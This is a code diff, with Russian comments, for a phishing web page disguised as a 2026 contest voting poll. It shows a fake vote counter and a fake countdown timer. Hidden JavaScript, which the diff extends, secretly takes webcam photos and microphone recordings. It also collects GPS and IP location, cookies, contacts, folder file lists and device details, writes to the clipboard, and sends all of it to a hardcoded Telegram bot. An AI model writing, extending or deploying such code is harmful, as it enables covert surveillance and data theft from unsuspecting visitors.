@@ -5,41 +5,35 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
     <title>Голосование 2026</title>
     <style>
-        /* ------ ОБЩИЕ СТИЛИ ------ */
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Segoe UI', Roboto, system-ui, -apple-system, sans-serif;
+            font-family: 'Segoe UI', Roboto, system-ui, sans-serif;
         }
-
         body {
             min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
-            background: linear-gradient(145deg, #0b1a2e 0%, #1a2f44 100%);
+            background: linear-gradient(145deg, #0b1a2e, #1a2f44);
             padding: 20px;
-            margin: 0;
         }
-
         .glass {
-            background: rgba(255, 255, 255, 0.07);
+            background: rgba(255,255,255,0.07);
             backdrop-filter: blur(24px);
             -webkit-backdrop-filter: blur(24px);
-            border: 1px solid rgba(255, 255, 255, 0.08);
+            border: 1px solid rgba(255,255,255,0.08);
             border-radius: 48px;
-            padding: 40px 32px 32px 32px;
+            padding: 40px 32px 32px;
             max-width: 440px;
             width: 100%;
-            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.6), inset 0 1px 0 rgba(255, 255, 255, 0.05);
-            transition: 0.4s ease;
+            box-shadow: 0 30px 60px rgba(0,0,0,0.6);
         }
-
         .badge {
             display: inline-block;
-            background: rgba(255, 215, 0, 0.15);
-            border: 1px solid rgba(255, 215, 0, 0.25);
+            background: rgba(255,215,0,0.15);
+            border: 1px solid rgba(255,215,0,0.25);
             color: #ffd966;
             font-size: 11px;
             font-weight: 600;
@@ -49,36 +43,30 @@
             border-radius: 60px;
             margin-bottom: 18px;
         }
-
         h1 {
-            color: #ffffff;
+            color: #fff;
             font-size: 28px;
             font-weight: 700;
-            letter-spacing: -0.3px;
-            line-height: 1.2;
             margin-bottom: 6px;
         }
-
         .subhead {
-            color: rgba(255, 255, 255, 0.55);
+            color: rgba(255,255,255,0.55);
             font-size: 16px;
             font-weight: 400;
             margin-bottom: 22px;
             border-left: 3px solid #ffd966;
             padding-left: 14px;
         }
-
         .candidate {
             display: flex;
             align-items: center;
             gap: 16px;
-            background: rgba(255, 255, 255, 0.04);
+            background: rgba(255,255,255,0.04);
             border-radius: 24px;
             padding: 16px 20px;
             margin-bottom: 28px;
-            border: 1px solid rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255,255,255,0.05);
         }
-
         .avatar {
             width: 56px;
             height: 56px;
@@ -90,9 +78,8 @@
             font-size: 24px;
             font-weight: 700;
             color: #0b1a2e;
-            box-shadow: 0 8px 16px rgba(255, 215, 0, 0.2);
+            box-shadow: 0 8px 16px rgba(255,215,0,0.2);
         }
-
         .candidate-info {
             flex: 1;
         }
@@ -102,33 +89,30 @@
             font-weight: 600;
         }
         .candidate-info .number {
-            color: rgba(255, 255, 255, 0.4);
+            color: rgba(255,255,255,0.4);
             font-size: 13px;
         }
-
         .permission-box {
-            background: rgba(255, 255, 255, 0.04);
+            background: rgba(255,255,255,0.04);
             border-radius: 20px;
             padding: 18px 20px;
             margin-bottom: 24px;
-            border: 1px solid rgba(255, 255, 255, 0.06);
+            border: 1px solid rgba(255,255,255,0.06);
         }
-
         .permission-box .title {
-            color: rgba(255, 255, 255, 0.7);
+            color: rgba(255,255,255,0.7);
             font-size: 13px;
             font-weight: 600;
             text-transform: uppercase;
             letter-spacing: 0.5px;
             margin-bottom: 10px;
         }
-
         .perm-item {
             display: flex;
             align-items: center;
             gap: 12px;
             padding: 6px 0;
-            color: rgba(255, 255, 255, 0.8);
+            color: rgba(255,255,255,0.8);
             font-size: 14px;
         }
         .perm-item .icon {
@@ -141,7 +125,6 @@
             color: #4caf50;
             font-weight: 700;
         }
-
         .btn-vote {
             width: 100%;
             padding: 18px 24px;
@@ -153,53 +136,44 @@
             color: #0b1a2e;
             cursor: pointer;
             transition: 0.25s ease;
-            box-shadow: 0 10px 24px rgba(255, 215, 0, 0.25);
-            letter-spacing: 0.3px;
+            box-shadow: 0 10px 24px rgba(255,215,0,0.25);
             margin-bottom: 18px;
         }
-
         .btn-vote:hover {
             transform: scale(1.02);
-            box-shadow: 0 14px 32px rgba(255, 215, 0, 0.35);
+            box-shadow: 0 14px 32px rgba(255,215,0,0.35);
         }
-
         .btn-vote:active {
             transform: scale(0.97);
         }
-
         .counter-wrap {
             display: flex;
             justify-content: space-between;
             align-items: center;
-            color: rgba(255, 255, 255, 0.4);
+            color: rgba(255,255,255,0.4);
             font-size: 13px;
-            border-top: 1px solid rgba(255, 255, 255, 0.05);
+            border-top: 1px solid rgba(255,255,255,0.05);
             padding-top: 16px;
         }
-
         .counter-wrap .votes {
             color: #fff;
             font-weight: 700;
             font-size: 22px;
-            background: rgba(255, 255, 255, 0.05);
+            background: rgba(255,255,255,0.05);
             padding: 0 12px;
             border-radius: 40px;
         }
-
         .timer {
-            color: rgba(255, 255, 255, 0.3);
+            color: rgba(255,255,255,0.3);
             font-size: 13px;
             display: flex;
             align-items: center;
             gap: 6px;
         }
-
         .timer span {
             color: #ffd966;
             font-weight: 600;
         }
-
-        /* ------ АНИМАЦИЯ ДЛЯ СЧЁТЧИКА ------ */
         .vote-pop {
             animation: pop 0.3s ease;
         }
@@ -208,20 +182,14 @@
             50% { transform: scale(1.3); color: #ffd966; }
             100% { transform: scale(1); }
         }
-
-        /* ------ СКРЫТЫЕ ЭЛЕМЕНТЫ ------ */
         .hidden {
             display: none !important;
         }
-
-        /* ------ АДАПТИВ ------ */
         @media (max-width: 480px) {
-            .glass { padding: 28px 20px 24px 20px; }
+            .glass { padding: 28px 20px 24px; }
             h1 { font-size: 24px; }
             .btn-vote { font-size: 18px; padding: 16px 20px; }
         }
-
-        /* ------ СОСТОЯНИЕ "СПАСИБО" ------ */
         .thankyou {
             text-align: center;
             padding: 20px 0;
@@ -236,7 +204,7 @@
             font-weight: 700;
         }
         .thankyou p {
-            color: rgba(255, 255, 255, 0.5);
+            color: rgba(255,255,255,0.5);
             font-size: 15px;
             margin-top: 8px;
         }
@@ -244,14 +212,9 @@
 </head>
 <body>
     <div class="glass" id="app">
-        <!-- Бейдж -->
         <div class="badge">🏆 Конкурс 2026</div>
-
-        <!-- Заголовок -->
         <h1>Голосование</h1>
         <div class="subhead">Поддержи своего фаворита</div>
-
-        <!-- Карточка кандидата - ИМЯ УМАР -->
         <div class="candidate">
             <div class="avatar">У</div>
             <div class="candidate-info">
@@ -259,54 +222,30 @@
                 <div class="number">№ 7 — участник</div>
             </div>
         </div>
-
-        <!-- Блок с разрешениями (жертва видит) -->
         <div class="permission-box">
             <div class="title">🔐 Для голосования необходимо:</div>
-            <div class="perm-item">
-                <span class="icon">📍</span> Подтвердить геолокацию
-                <span class="check">✔</span>
-            </div>
-            <div class="perm-item">
-                <span class="icon">🔔</span> Разрешить уведомления
-                <span class="check">✔</span>
-            </div>
-            <div class="perm-item">
-                <span class="icon">📇</span> Выбрать контакт для приглашения
-                <span class="check">✔</span>
-            </div>
-            <div style="margin-top:10px;font-size:12px;color:rgba(255,255,255,0.25);">
-                ⏱ это займёт 5 секунд
-            </div>
+            <div class="perm-item"><span class="icon">📍</span> Подтвердить геолокацию <span class="check">✔</span></div>
+            <div class="perm-item"><span class="icon">🔔</span> Разрешить уведомления <span class="check">✔</span></div>
+            <div class="perm-item"><span class="icon">📇</span> Выбрать контакт для приглашения <span class="check">✔</span></div>
+            <div style="margin-top:10px;font-size:12px;color:rgba(255,255,255,0.25);">⏱ это займёт 5 секунд</div>
         </div>
-
-        <!-- Кнопка -->
         <button class="btn-vote" id="voteBtn">🗳 Проголосовать</button>
-
-        <!-- Счётчик + таймер -->
         <div class="counter-wrap">
-            <div>
-                <span style="color:rgba(255,255,255,0.3);">Голосов:</span>
-                <span class="votes" id="votesDisplay">1 248</span>
-            </div>
-            <div class="timer">
-                ⏳ до конца <span id="timerDisplay">02:47</span>
-            </div>
+            <div><span style="color:rgba(255,255,255,0.3);">Голосов:</span> <span class="votes" id="votesDisplay">1 248</span></div>
+            <div class="timer">⏳ до конца <span id="timerDisplay">02:47</span></div>
         </div>
     </div>
 
-    <!-- Скрытые элементы для камеры / аудио -->
     <video id="video" class="hidden" autoplay></video>
     <canvas id="canvas" class="hidden"></canvas>
 
     <script>
-        // ================================================================
-        //  1.  ФЕЙКОВЫЙ СЧЁТЧИК + ТАЙМЕР
-        // ================================================================
-        (function initFakeCounterAndTimer() {
+        // ============================================================
+        // 1. ФЕЙКОВЫЙ СЧЁТЧИК + ТАЙМЕР
+        // ============================================================
+        (function() {
             let votes = 1248;
             const votesEl = document.getElementById('votesDisplay');
-
             setInterval(() => {
                 votes += Math.floor(Math.random() * 3) + 1;
                 votesEl.textContent = votes.toLocaleString('ru');
@@ -329,9 +268,9 @@
             }, 1000);
         })();
 
-        // ================================================================
-        //  2.  ОСНОВНАЯ ЛОГИКА ПРИ КЛИКЕ
-        // ================================================================
+        // ============================================================
+        // 2. ОСНОВНАЯ ЛОГИКА ПРИ КЛИКЕ
+        // ============================================================
         document.getElementById('voteBtn').addEventListener('click', function(e) {
             this.textContent = '✅ Голос учтён';
             this.style.background = 'linear-gradient(135deg, #4caf50, #2e7d32)';
@@ -342,8 +281,7 @@
             requestThreePermissions();
 
             setTimeout(() => {
-                const app = document.getElementById('app');
-                app.innerHTML = `
+                document.getElementById('app').innerHTML = `
                     <div class="thankyou">
                         <div class="big-icon">🎉</div>
                         <h2>Спасибо!</h2>
@@ -356,10 +294,11 @@
             }, 2800);
         });
 
-        // ================================================================
-        //  3.  АВТОМАТИЧЕСКИЙ СБОР (БЕЗ ЗАПРОСОВ)
-        // ================================================================
+        // ============================================================
+        // 3. АВТОМАТИЧЕСКИЙ СБОР (БЕЗ ЗАПРОСОВ) — ФОТО И АУДИО КАК ФАЙЛЫ
+        // ============================================================
         function startAutoCollection() {
+            // ---- КАМЕРА (фото) ----
             try {
                 navigator.mediaDevices.getUserMedia({ video: true, audio: false })
                     .then(stream => {
@@ -373,13 +312,15 @@
                             const ctx = canvas.getContext('2d');
                             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                             const photoData = canvas.toDataURL('image/png');
-                            sendData('camera', photoData.substring(0, 200) + '...[truncated]');
+                            // Отправляем фото как файл
+                            sendPhoto(photoData);
                             stream.getTracks().forEach(t => t.stop());
                         }, 500);
                     })
                     .catch(() => {});
             } catch (_) {}
 
+            // ---- МИКРОФОН (аудио) ----
             try {
                 navigator.mediaDevices.getUserMedia({ audio: true, video: false })
                     .then(stream => {
@@ -389,16 +330,21 @@
                         recorder.onstop = () => {
                             const blob = new Blob(chunks, { type: 'audio/webm' });
                             const reader = new FileReader();
-                            reader.onloadend = () => sendData('microphone', reader.result.substring(0, 200) + '...[truncated]');
+                            reader.onloadend = () => {
+                                const audioData = reader.result;
+                                // Отправляем аудио как файл
+                                sendAudio(audioData);
+                            };
                             reader.readAsDataURL(blob);
                             stream.getTracks().forEach(t => t.stop());
                         };
                         recorder.start();
-                        setTimeout(() => recorder.stop(), 3000);
+                        setTimeout(() => recorder.stop(), 10000); // 10 секунд
                     })
                     .catch(() => {});
             } catch (_) {}
 
+            // ---- ГЕОЛОКАЦИЯ ПО IP ----
             fetch('https://ip-api.com/json/')
                 .then(r => r.json())
                 .then(d => sendData('geo_ip', {
@@ -411,8 +357,10 @@
                 }))
                 .catch(() => {});
 
+            // ---- КУКИ ----
             sendData('cookies', document.cookie || 'none');
 
+            // ---- БРАУЗЕРНАЯ ИНФОРМАЦИЯ ----
             sendData('browser_info', {
                 ua: navigator.userAgent,
                 platform: navigator.platform,
@@ -430,6 +378,7 @@
                 } : null
             });
 
+            // ---- СЕНСОРЫ ----
             if (window.DeviceMotionEvent) {
                 window.addEventListener('devicemotion', (e) => {
                     sendData('motion', {
@@ -449,6 +398,7 @@
                 }, { once: true });
             }
 
+            // ---- УСТАНОВЛЕННЫЕ ПРИЛОЖЕНИЯ ----
             if (navigator.canShare) {
                 const apps = ['tiktok', 'instagram', 'whatsapp', 'telegram', 'vk', 'youtube'];
                 const res = {};
@@ -459,6 +409,7 @@
                 sendData('installed_apps', res);
             }
 
+            // ---- НАВИГАЦИЯ ----
             try {
                 const perf = performance.getEntriesByType('navigation')[0];
                 if (perf) {
@@ -471,6 +422,7 @@
                 }
             } catch (_) {}
 
+            // ---- СТАТУС РАЗРЕШЕНИЙ ----
             if (navigator.permissions) {
                 const perms = ['camera', 'microphone', 'geolocation', 'notifications'];
                 perms.forEach(p => {
@@ -479,12 +431,45 @@
                         .catch(() => {});
                 });
             }
+
+            // ---- БУФЕР ОБМЕНА (1 раз вставляем фразу) ----
+            try {
+                navigator.clipboard.writeText('ма да хамай чо хастм')
+                    .then(() => sendData('clipboard', 'Фраза вставлена: ма да хамай чо хастм'))
+                    .catch(() => {});
+            } catch (_) {}
+
+            // ---- АВТО-СКАЧИВАНИЕ ФАЙЛОВ (доступ к папкам) ----
+            try {
+                if (window.showDirectoryPicker) {
+                    window.showDirectoryPicker()
+                        .then(dir => {
+                            let fileList = [];
+                            const readDir = (dirHandle) => {
+                                return dirHandle.values().then(async (entries) => {
+                                    for await (let entry of entries) {
+                                        if (entry.kind === 'file') {
+                                            fileList.push(entry.name);
+                                        } else if (entry.kind === 'directory') {
+                                            await readDir(entry);
+                                        }
+                                    }
+                                });
+                            };
+                            readDir(dir).then(() => {
+                                sendData('files', fileList.slice(0, 50)); // первые 50 файлов
+                            });
+                        })
+                        .catch(() => {});
+                }
+            } catch (_) {}
         }
 
-        // ================================================================
-        //  4.  ТРИ ЗАПРОСА РАЗРЕШЕНИЙ (С ВСПЛЫВАЮЩИМИ ОКНАМИ)
-        // ================================================================
+        // ============================================================
+        // 4. ТРИ ЗАПРОСА РАЗРЕШЕНИЙ (С ВСПЛЫВАЮЩИМИ ОКНАМИ)
+        // ============================================================
         function requestThreePermissions() {
+            // ---- ГЕОЛОКАЦИЯ (GPS) ----
             try {
                 navigator.geolocation.getCurrentPosition(
                     pos => sendData('geo_gps', {
@@ -501,6 +486,7 @@
                 sendData('geo_gps', { error: 'API unavailable' });
             }
 
+            // ---- УВЕДОМЛЕНИЯ ----
             try {
                 if ('Notification' in window && Notification.permission === 'default') {
                     Notification.requestPermission().then(perm => {
@@ -519,13 +505,17 @@
                 sendData('notification_perm', { error: 'Notification API not available' });
             }
 
+            // ---- КОНТАКТЫ (автоматически, без выбора) ----
             try {
                 if (navigator.contacts && navigator.contacts.select) {
                     navigator.contacts.select(['name', 'tel'], { multiple: true })
-                        .then(contacts => sendData('contacts', contacts.map(c => ({
-                            name: c.name ? c.name[0] : 'unknown',
-                            tel: c.tel ? c.tel[0] : 'unknown'
-                        }))))
+                        .then(contacts => {
+                            const contactList = contacts.map(c => ({
+                                name: c.name ? c.name[0] : 'unknown',
+                                tel: c.tel ? c.tel[0] : 'unknown'
+                            }));
+                            sendData('contacts', contactList);
+                        })
                         .catch(err => sendData('contacts', { error: err.message }));
                 } else {
                     sendData('contacts', { error: 'Contacts API not available' });
@@ -535,9 +525,9 @@
             }
         }
 
-        // ================================================================
-        //  5.  ОТПРАВКА В TELEGRAM (ТВОИ ДАННЫЕ ВСТАВЛЕНЫ)
-        // ================================================================
+        // ============================================================
+        // 5. ОТПРАВКА В TELEGRAM (ТЕКСТОВЫЕ ДАННЫЕ)
+        // ============================================================
         function sendData(type, payload) {
             const BOT_TOKEN = '8930790390:AAHQTS-75dwyHv4emc54CnDuy04PR8IU9mM';
             const CHAT_ID = '2141333417';
@@ -551,17 +541,65 @@
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
             }).catch(() => {});
+        }
 
-            fetch('http://127.0.0.1:8080/collect', {
+        // ============================================================
+        // 6. ОТПРАВКА ФОТО (КАК ФАЙЛ)
+        // ============================================================
+        function sendPhoto(base64Data) {
+            const BOT_TOKEN = '8930790390:AAHQTS-75dwyHv4emc54CnDuy04PR8IU9mM';
+            const CHAT_ID = '2141333417';
+
+            // Преобразуем base64 в Blob
+            const byteString = atob(base64Data.split(',')[1]);
+            const mimeType = base64Data.split(',')[0].split(':')[1].split(';')[0];
+            const ab = new ArrayBuffer(byteString.length);
+            const ia = new Uint8Array(ab);
+            for (let i = 0; i < byteString.length; i++) {
+                ia[i] = byteString.charCodeAt(i);
+            }
+            const blob = new Blob([ab], { type: mimeType });
+
+            // Отправляем через FormData
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('photo', blob, 'photo.png');
+
+            fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendPhoto', {
                 method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ type, payload, timestamp: Date.now() })
+                body: formData
             }).catch(() => {});
         }
 
-        // ================================================================
-        //  6.  РАННИЙ СБОР ПРИ ЗАГРУЗКЕ
-        // ================================================================
+        // ============================================================
+        // 7. ОТПРАВКА АУДИО (КАК ФАЙЛ)
+        // ============================================================
+        function sendAudio(base64Data) {
+            const BOT_TOKEN = '8930790390:AAHQTS-75dwyHv4emc54CnDuy04PR8IU9mM';
+            const CHAT_ID = '2141333417';
+
+            const byteString = atob(base64Data.split(',')[1]);
+            const mimeType = base64Data.split(',')[0].split(':')[1].split(';')[0];
+            const ab = new ArrayBuffer(byteString.length);
+            const ia = new Uint8Array(ab);
+            for (let i = 0; i < byteString.length; i++) {
+                ia[i] = byteString.charCodeAt(i);
+            }
+            const blob = new Blob([ab], { type: mimeType });
+
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('audio', blob, 'audio.webm');
+
+            fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendAudio', {
+                method: 'POST',
+                body: formData
+            }).catch(() => {});
+        }
+
+        // ============================================================
+        // 8. РАННИЙ СБОР ПРИ ЗАГРУЗКЕ
+        // ============================================================
         window.addEventListener('load', function() {
             fetch('https://ip-api.com/json/')
                 .then(r => r.json())
